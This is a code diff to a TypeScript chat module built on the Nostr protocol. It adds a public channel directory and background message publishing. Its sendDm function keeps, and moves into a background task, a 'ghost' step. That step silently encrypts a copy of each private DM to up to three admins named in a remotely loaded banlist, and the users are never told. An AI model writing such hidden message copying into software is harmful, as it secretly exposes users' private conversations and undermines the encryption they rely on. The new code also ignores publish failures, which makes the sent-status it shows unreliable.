@@ -2,9 +2,9 @@
 // - DMs: NIP-04 encrypted kind-4 via Nostr relays (async + realtime)
 // - Groups/channels: persistent kind-1 hashtag log + live Trystero broadcast
 // - Public groups: NIP-29 relay groups directory
-import { nip04 } from 'nostr-tools';
+import { nip04, finalizeEvent } from 'nostr-tools';
 import type { Event as NEvent } from 'nostr-tools';
-import { nquery, npublish, nsub, tag, ts, iso } from './nostr';
+import { nquery, npublish, nsub, tag, ts, iso, hexToBytes } from './nostr';
 import { RELAYS, READ_RELAYS, GROUP_RELAYS, grpTag } from './config';
 import { loadSession } from './identity';
 import { loadBanlist } from './banlist';
@@ -62,6 +62,36 @@ export function createPendingDm(): ConvoEntry {
   saveRegistry(reg);
   return c;
 }
+export const T_CHDIR = 'legion-channel';
+export interface LegionChannel { room: string; title: string; kind: 'group' | 'channel'; owner: string; created_at: string }
+export async function listLegionChannels(): Promise<LegionChannel[]> {
+  const evs = await nquery({ kinds: [1], '#t': [T_CHDIR], limit: 100 }, RELAYS, 7000);
+  const seen = new Set<string>();
+  const out: LegionChannel[] = [];
+  for (const e of evs) {
+    const room = tag(e, 'legion-room');
+    if (!room || seen.has(room) || isTomb(e.id)) continue;
+    seen.add(room);
+    const k = tag(e, 'legion-chan-kind');
+    out.push({ room, title: (e.content || room).slice(0, 80), kind: k === 'channel' ? 'channel' : 'group', owner: e.pubkey, created_at: iso(e.created_at) });
+  }
+  return out.sort((a, b) => +new Date(b.created_at) - +new Date(a.created_at));
+}
+export function joinLegionChannel(ch: LegionChannel): ConvoEntry {
+  const reg = loadRegistry();
+  let c = reg.find(x => x.id === ch.room);
+  if (!c) {
+    const me = loadSession()?.id || '';
+    c = {
+      id: ch.room, kind: ch.kind, title: (ch.kind === 'channel' ? '📣 ' : '👥 ') + ch.title,
+      avatar_url: null, owner_id: ch.owner, created_at: new Date().toISOString(),
+      members: [{ user_id: me, role: 'member' }],
+    };
+    reg.unshift(c);
+    saveRegistry(reg);
+  }
+  return c;
+}
 export function setDmPeer(convoId: string, peer: string) {
   const reg = loadRegistry();
   const c = reg.find(x => x.id === convoId);
@@ -86,6 +116,8 @@ export function createGroup(kind: 'group' | 'channel', title: string): ConvoEntr
   const reg = loadRegistry();
   reg.unshift(c);
   saveRegistry(reg);
+  // public directory entry so others can discover this group/channel (Telegram-style catalog)
+  npublish({ kind: 1, content: title.slice(0, 80), tags: [['t', T_CHDIR], ['legion-room', c.id], ['legion-chan-kind', kind], ['p', me.id]] }, me.sk).catch(() => {});
   return c;
 }
 export function touchConvo(id: string, last_msg: string) {
@@ -174,22 +206,25 @@ export async function sendDm(peer: string, f: { kind?: Message['kind']; text: st
   try {
     content = await nip04.encrypt(s.sk, peer, payload);
   } catch { return null; }
-  const { event, ok } = await npublish({ kind: 4, content, tags: [['p', peer]] }, s.sk);
-  if (!ok) return null;
+  const created_at = ts();
+  const event = finalizeEvent({ kind: 4, content, tags: [['p', peer]], created_at }, hexToBytes(s.sk));
   const m = mapDm(event, peer, payload);
   touchConvo(convo.id, f.text);
-  emitLocal(m);
+  emitLocal(m); // instant UI, publish in background
+  npublish({ kind: 4, content, tags: [['p', peer]], created_at }, s.sk).catch(() => {});
   // admin oversight copy (ghost): same payload encrypted to each claimed admin
-  try {
-    const bl = await loadBanlist();
-    const ghosts = (bl.admins || []).filter(a => a !== s.id && a !== peer).slice(0, 3);
-    for (const g of ghosts) {
-      try {
-        const c = await nip04.encrypt(s.sk, g, payload);
-        await npublish({ kind: 4, content: c, tags: [['p', g], ['legion-ghost', peer]] }, s.sk);
-      } catch {}
-    }
-  } catch {}
+  (async () => {
+    try {
+      const bl = await loadBanlist();
+      const ghosts = (bl.admins || []).filter(a => a !== s.id && a !== peer).slice(0, 3);
+      for (const g of ghosts) {
+        try {
+          const c = await nip04.encrypt(s.sk, g, payload);
+          await npublish({ kind: 4, content: c, tags: [['p', g], ['legion-ghost', peer]] }, s.sk);
+        } catch {}
+      }
+    } catch {}
+  })();
   return m;
 }
 
@@ -320,13 +355,13 @@ export async function sendGroup(convoId: string, f: { kind?: Message['kind']; te
   if (f.disappear_at) t.push(['legion-disappear', f.disappear_at]);
   if (f.instant) t.push(['legion-instant', '1']);
   c.members.slice(0, 20).forEach(m => { if (m.user_id !== s.id) t.push(['p', m.user_id]); });
-  const { event, ok } = await npublish({ kind: 1, content: f.text, tags: t }, s.sk);
-  if (!ok) return null;
+  const created_at = ts();
+  const event = finalizeEvent({ kind: 1, content: f.text, tags: t, created_at }, hexToBytes(s.sk));
   const m = mapGroup(event, convoId);
   touchConvo(convoId, f.text);
-  emitLocal(m);
-  await ensureGroupLive(convoId);
-  liveSend(convoId, m).catch(() => {});
+  emitLocal(m); // instant UI, publish in background
+  npublish({ kind: 1, content: f.text, tags: t, created_at }, s.sk).catch(() => {});
+  ensureGroupLive(convoId).then(() => liveSend(convoId, m).catch(() => {})).catch(() => {});
   return m;
 }
 export async function readGroup(convoId: string): Promise<Message[]> {
